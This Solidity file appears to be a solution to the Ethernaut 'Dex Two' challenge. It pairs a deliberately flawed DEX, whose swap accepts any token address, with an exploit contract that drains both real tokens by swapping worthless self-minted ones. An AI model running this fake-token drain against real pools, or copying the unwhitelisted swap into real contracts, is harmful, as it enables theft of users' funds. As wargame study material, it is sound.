// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import 'openzeppelin-contracts/contracts/utils/math/SafeMath.sol';
import 'openzeppelin-contracts/contracts/access/Ownable.sol';

contract DexTwo is Ownable {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }

  function add_liquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  } 

  function getSwapAmount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableTokenTwo is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public returns(bool){
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}

contract DexTwoExploit {

    function dexExploit (address _contract) public {
        DexTwo dexContract = DexTwo(_contract);
        ERC20 token1 = ERC20(dexContract.token1());
        ERC20 token2 = ERC20(dexContract.token2());

        // Create fake tokens as suggested
        SwappableTokenTwo fakeToken1 = new SwappableTokenTwo(address(dexContract), "Fake 1", "FAKE1", 10_000);
        SwappableTokenTwo fakeToken2 = new SwappableTokenTwo(address(dexContract), "Fake 2", "FAKE2", 10_000);
        
        // Approve the dex to manage all of our token
        token1.approve(address(dexContract), 1000);
        token2.approve(address(dexContract), 1000);
        fakeToken1.approve(address(dexContract), 1000);
        fakeToken2.approve(address(dexContract), 1000);

        // send 1 fake token to the DexTwo to have at least 1 of liquidity
        ERC20(fakeToken1).transfer(address(dexContract), 100);
        ERC20(fakeToken2).transfer(address(dexContract), 100);

        ERC20(fakeToken1).transfer(address(this), 100);
        ERC20(fakeToken2).transfer(address(this), 100);

        // Swap 100 fakeTokens to get 100 real tokens
        dexContract.swap(address(fakeToken1), address(token1), 100);
        dexContract.swap(address(fakeToken2), address(token2), 100);
    }
}
